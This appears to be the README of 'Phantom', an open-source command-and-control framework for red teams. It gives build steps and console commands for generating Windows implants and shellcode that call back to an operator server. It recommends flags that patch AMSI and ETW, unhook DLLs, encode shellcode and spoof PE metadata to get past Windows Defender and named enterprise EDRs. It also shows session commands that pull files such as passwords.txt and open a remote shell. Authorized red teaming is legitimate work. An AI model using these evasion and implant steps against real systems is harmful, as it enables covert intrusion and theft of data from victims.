# Phantom

<p align="center">
  <a href="https://github.com/cryptdefender3232/phantom/actions/workflows/ci.yml">
    <img src="https://github.com/cryptdefender3232/phantom/actions/workflows/ci.yml/badge.svg" alt="CI"/>
  </a>
  <a href="https://github.com/cryptdefender3232/phantom/releases">
    <img src="https://img.shields.io/github/v/release/cryptdefender3232/phantom" alt="Release"/>
  </a>
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License"/>
  <img src="https://img.shields.io/badge/Go-1.25+-00ADD8.svg" alt="Go"/>
</p>

**Phantom** is an open source cross-platform C2 (Command & Control) framework built for professional red team operators and penetration testers. It enables security teams to simulate real-world adversary behavior against authorized targets — with built-in engagement management, operator audit logging, and finding tracking that no other open source C2 provides.

> ⚠️ **For authorized security testing only.** Using this tool against systems you do not own or have explicit written permission to test is illegal.

---

## Features

### Core C2
- **Multi-protocol** — mTLS, WireGuard, HTTP/S, DNS
- **Beacon mode** — async check-in with configurable interval/jitter
- **Session mode** — interactive real-time shell
- **Multiplayer** — multiple operators on one server
- **Pivoting** — TCP and Named Pipe pivots through compromised hosts
- **BOF/COFF** — in-memory Beacon Object File execution
- **Process injection** — multiple injection techniques
- **In-memory .NET** — execute assemblies without touching disk

### AV/EDR Evasion
- **AMSI bypass** — patches `AmsiScanBuffer` to blind Windows Defender memory scanning
- **ETW bypass** — patches `EtwEventWrite` to disable EDR telemetry collection
- **DLL unhooking** — reloads `ntdll`, `kernel32`, `kernelbase` from disk to remove EDR hooks
- **Sleep obfuscation** — XOR-encrypts implant memory during beacon idle periods, defeating memory scanners
- **Indirect syscalls** — resolves NT syscall numbers from disk and invokes them directly, bypassing CrowdStrike, SentinelOne, and other EDRs that rely on userland API hooking
- **Compile-time obfuscation** — randomizes all symbols, strings, and function names at build time
- **Per-binary encryption** — every generated implant has unique asymmetric keys, preventing signature reuse

### Engagement Management *(unique to Phantom)*
Track every red team engagement from start to finish — directly inside the C2 console.

```
engagements create --name "Client ABC Q1 2025" --scope "10.0.0.0/8" --start 2025-01-15
engagements assign-session <eng-id> <session-id>
engagements add-finding <eng-id> --title "Domain Admin via Kerberoasting" \
  --severity critical --host dc01.corp.local \
  --evidence "Cracked hash for svc_sql in 4 minutes"
engagements findings <eng-id>
```

### Operator Audit Log *(unique to Phantom)*
Every action taken by every operator is automatically logged — who did what, when, and to which target.

```
audit                          # last 50 entries
audit --operator john          # filter by operator
audit --action engagement      # filter by action type
audit --since 2025-01-01       # filter by date
```

### CI/CD & Security
- Automated testing on every push (unit + e2e)
- Cross-platform build matrix (Linux, macOS, Windows, FreeBSD)
- `govulncheck` dependency vulnerability scanning
- CodeQL security analysis (weekly + every PR)
- Protobuf consistency enforcement

---

## Quick Start

### Requirements
- Go 1.25+
- Linux, macOS, or Windows

### Build from source

```bash
git clone https://github.com/cryptdefender3232/phantom.git
cd phantom
make
```

This produces `phantom-server` and `phantom-client`.

---

## Usage

### 1. Start the server

```bash
./phantom-server
```

Wait for the `[server] phantom >` prompt.

### 2. Generate an operator config

Inside the server console:
```
new-operator --name operator1 --lhost <your-server-ip>
```

Copy the generated `.cfg` file to `~/.phantom-client/configs/` on the operator machine.

### 3. Connect with the client

```bash
./phantom-client
```

### 4. Start a listener

```
mtls --lhost <your-server-ip> --lport 8888
```

### 5. Generate an implant

**Standard implant:**
```
generate --mtls <your-server-ip>:8888 --os windows --arch amd64 --format exe --save /tmp/
```

**With full AV/EDR evasion (recommended):**
```
generate --mtls <your-server-ip>:8888 --os windows --arch amd64 --format exe --evasion --obfuscate --save /tmp/
```

**As shellcode with Shikata-Ga-Nai encoder:**
```
generate --mtls <your-server-ip>:8888 --os windows --arch amd64 --format shellcode --shellcode-encoder shikata-ga-nai --save /tmp/
```

Run the generated file on the target. A session will appear in the console.

### 6. Interact with a session

```
sessions
use <session-id>
whoami
ps
ls C:\Users
download C:\Users\user\Documents\passwords.txt /tmp/
screenshot
shell
```

---

## Engagement Workflow

```bash
# 1. Create engagement
engagements create --name "Pentest Corp XYZ" --scope "192.168.1.0/24"

# 2. Assign compromised hosts
engagements assign-session <eng-id> <session-id>

# 3. Document findings as you go
engagements add-finding <eng-id> \
  --title "Local Admin via Password Spray" \
  --severity high \
  --host 192.168.1.50 \
  --evidence "net user /domain output"

# 4. Review all findings
engagements findings <eng-id>

# 5. Review operator activity
audit --since 2025-01-15
```

---

## Evasion Reference

| Flag | Effect |
|------|--------|
| `--evasion` | Enables AMSI patch, ETW patch, DLL unhooking, sleep obfuscation, indirect syscalls |
| `--obfuscate` | Compile-time symbol/string obfuscation via garble |
| `--format shellcode` | Output as raw shellcode instead of PE |
| `--shellcode-encoder shikata-ga-nai` | Polymorphic shellcode encoding |
| `--spoof-metadata <donor.exe>` | Clone PE metadata from a legitimate binary |

**Recommended for bypassing Windows Defender:**
```
generate --mtls <ip>:8888 --os windows --arch amd64 --format exe --evasion --obfuscate
```

**Recommended for bypassing enterprise EDR (CrowdStrike, SentinelOne):**
```
generate --mtls <ip>:8888 --os windows --arch amd64 --format shellcode \
  --shellcode-encoder shikata-ga-nai --evasion --obfuscate
```

---

## Supported Platforms

| | Server | Client | Implant |
|--|--------|--------|---------|
| Linux amd64 | ✅ | ✅ | ✅ |
| Linux arm64 | ✅ | ✅ | ✅ |
| macOS amd64 | ✅ | ✅ | ✅ |
| macOS arm64 (M1/M2/M3) | ✅ | ✅ | ✅ |
| Windows amd64 | ✅ | ✅ | ✅ |
| Windows arm64 | ✅ | ✅ | ✅ |
| FreeBSD amd64 | ✅ | ✅ | ✅ |
# phantom
